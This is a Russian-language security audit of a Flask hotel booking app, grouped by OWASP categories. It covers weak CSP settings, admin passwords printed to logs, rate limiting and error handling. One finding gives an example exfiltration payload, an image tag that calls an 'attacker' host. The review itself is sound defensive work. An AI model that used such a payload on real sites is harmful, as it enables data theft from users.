## A02 — Security Misconfiguration

**Нашел.**

1. **`app.py`, `add_security_headers`** — CSP добавлена:
   ```
   script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;
   style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://fonts.googleapis.com;
   img-src 'self' data: https:;
   ```
   - **`'unsafe-inline'` в `script-src`** практически обнуляет защиту от XSS: любая инъекция inline-скрипта исполнится.
   - **`img-src https:`** разрешает загрузку картинок с любого HTTPS-хоста — позволяет эксфильтрацию через `<img src="https://attacker/...">` при наличии HTML-инъекции.
   - **Опасность:** средняя. CSP есть, но ослаблена.

2. **`db.py`, `DB_NAME = os.path.join(BASE_DIR, "hotel_management.db")`**  
   SQLite рядом с кодом. Проверить конфиг веб-сервера чтением кода нельзя, но это классический риск.

3. **`templates/base.html`, `templates/admin/base_admin.html`** — `X-Frame-Options: SAMEORIGIN` стоит через `setdefault`, но `frame-ancestors 'self'` в CSP дублирует. OK.

## A04 — Cryptographic Failures and Secrets

**Нашел.**

1. **`auth.py`, `hash_password`, `validate_password`** — `scrypt`, политика 12–256 символов. Чисто.

2. **`auth.py`, `password_matches`** — принимает только `scrypt:`, `pbkdf2:`, `argon2:`. Legacy-пароли не принимаются. Чисто.

3. **`db.py`, `add_admin_user`**  
   ```python
   if not password:
       password = secrets.token_urlsafe(24)
       print("\nВАЖНО: создан временный пароль администратора:")
       print(password)
   ```
   - **Вход:** отсутствие `UYUT_BOOTSTRAP_ADMIN_PASSWORD`.  
   - **Выход:** пароль админа в stdout → `docker logs`, CI, journald.  
   - **Опасность:** высокая, если не был сменён сразу и логи доступны кому-то ещё.

4. **`app.py`, `SESSION_COOKIE_SECURE = is_production or os.environ.get("SESSION_COOKIE_SECURE", "0") == "1"`**  
   В dev cookie уходит по HTTP. Ожидаемо, но нет явного запрета на prod без HTTPS.

**Что нельзя проверить:** реальные значения `UYUT_SECRET_KEY`, `UYUT_BOOTSTRAP_ADMIN_PASSWORD`, `UYUT_DEMO_*`, наличие `.env` в репозитории, права на файл БД.

## A05 — Injection (SQL, command, HTML)

**Нашел.**

1. **SQL** — все запросы параметризованы в `admin.py`, `auth.py`, `public.py`, `features.py`, `payments.py`, `utils.py`. `next_id` строит f-строку по белому списку таблиц/полей + regex на префикс. Чисто.

2. **`routes/auth.py`, строки `flash(str(e) if isinstance(e, ValueError) else '...', 'danger')`**  
   `strptime("abc", '%Y-%m-%d')` даёт `time data 'abc' does not match format '%Y-%m-%d'`.  
   - **Вход:** POST с `check_in=abc`.  
   - **Выход:** Python-сообщение об исключении в UI.  
   - **Опасность:** низкая. Утечка деталей + удобство для fuzzing.

3. **`templates/admin/bookings.html`, `status-{{ b.Статус|replace(' ','-') }}`**  
   Значение статуса идёт в `class=...`. Сейчас статус — из фиксированного множества, но если когда-нибудь появится пользовательский статус, получим инъекцию классов. Чисто, но хрупко.

4. **`templates/admin/clients.html`, `onsubmit="return confirm('Удалить гостя {{ c.Фамилия }} {{ c.Имя }}?...')"`**  
   Jinja2 экранирует `'` в `&#39;`, поэтому пробой невозможен. Чисто.

5. **Command injection** — `subprocess`, `os.system`, `eval`, `exec`, `pickle.loads` не используются. Чисто.

## A06 — Insecure Design

**Нашел.**

1. **`routes/auth.py`, `login`**  
   ```python
   if login_value.lower() == 'admin':
       cursor.execute("... WHERE u.Роль = 'admin' LIMIT 1")
   ```
   Второй админ (`admin2`) не сможет войти по логину — только по телефону через fallback. Низкая опасность, плохая масштабируемость.

2. **`routes/admin.py`, `admin_booking_update`**  
   Нет ограничения переходов статуса. Из `Завершено` можно вернуть в `Подтверждено`, если дата заезда в будущем (проверка `if new_status in ACTIVE and _date(...) < today` пропустит, если дата в будущем). Edge case.

3. **`routes/payments.py`, `create_payment`** — гонка закрыта (`BEGIN IMMEDIATE` + проверка существующего платежа). Хорошо.

4. **`routes/auth.py`, `create_booking`** — повторная проверка конфликта внутри `BEGIN IMMEDIATE`, промокод пересчитывается. Хорошо.

5. **`templates/register.html`, `minlength="6"` для пароля**  
   Клиент разрешает 6, сервер требует 12. Не security, но UX + несогласованность.

## A07 — Authentication & Session

**Нашел.**

1. **`routes/auth.py`, `login`**  
   Rate-limit нормализует identifier. **Однако:**
   ```python
   client_ip = request.remote_addr or 'unknown'
   ```
   За прокси `remote_addr` — это адрес прокси. Все пользователи за одним прокси делят счётчик. Нужен `X-Forwarded-For` (с доверенным прокси) или identifier-only rate-limit.  
   - **Опасность:** средняя. Ложные срабатывания при легитимной нагрузке или обход с ротацией IP.

2. **`app.py`, CSRF-токен живёт в сессии без ротации.**  
   - **Вход:** XSS на странице.  
   - **Выход:** токен доступен через `window.UYUT_CSRF`.  
   - **Опасность:** низкая при HttpOnly+SameSite=Lax, но при XSS — полный контроль.

3. **`app.py`, `PERMANENT_SESSION_LIFETIME = 60 * 60 * 8`, нет idle-таймаута.** Сессия живёт 8 часов, даже если пользователь ушёл.

4. **`routes/auth.py`, `login` — успешные/неуспешные входы не пишутся в `Журнал_действий`** (см. A09).

**Что нельзя проверить:** реальный HTTPS-контур, HSTS-предзагрузку, ротацию `UYUT_SECRET_KEY`.

## A10 — Mishandling of Exceptional Conditions

**Нашел.**

1. **`routes/auth.py`, `flash(str(e) ...)`** — Python-сообщения исключений в UI. Низкая опасность, но информативно для атакующего.

2. **`routes/auth.py`, `create_booking`, `conn.rollback()` в `except` без проверки `conn.in_transaction`.**  
   В sqlite3 при уже закрытой транзакции падения нет, но лучше защищаться `if conn.in_transaction: conn.rollback()`.

3. **`payments.py`, `except Exception:` — не логирует `e` явно, только `logger.exception`.** OK.

4. **`routes/features.py`, `add_gallery`** — размер картинки проверяется (`<=5000x5000`), тип — через `PIL.Image`. Хорошо. Но `caption` обрезается до 200 символов уже **после** приёма — до обрезки в память может попасть длинная строка. Низкая.

5. **DoS-вектор:** `utils.next_id` линейно сканирует таблицу по `LIKE 'prefix%'`. При больших N и частых POST — деградация. Не security, но эксплуатационно.

5. **`hotel_logic.py`** совмещает миграции, бизнес-логику услуг и аудит. Лучше разнести: `migrations.py`, `services.py`, `audit.py`.

## Разбиение модулей на под-файлы

- **Python:** логика разнесена по `routes/*`. OK. `hotel_logic.py` перегружен.
- **HTML:** шаблоны в `templates/` и `templates/admin/`. OK.
- **CSS:** `style.css` (~950 строк) и `admin.css` (~200 строк). Тянет на разделение.
- **JS:** `base.html` содержит авто-вставку CSRF и UI-скрипты **инлайн**, что требует `'unsafe-inline'` в CSP. Стоит вынести в `static/js/*.js` с nonce/hash и убрать `'unsafe-inline'`.
- **Inline CSS/JS в шаблонах:** `booking.html`, `contact.html`, `room_detail.html`, `profile.html` — большие `<style>` блоки. Мешает строгому CSP.
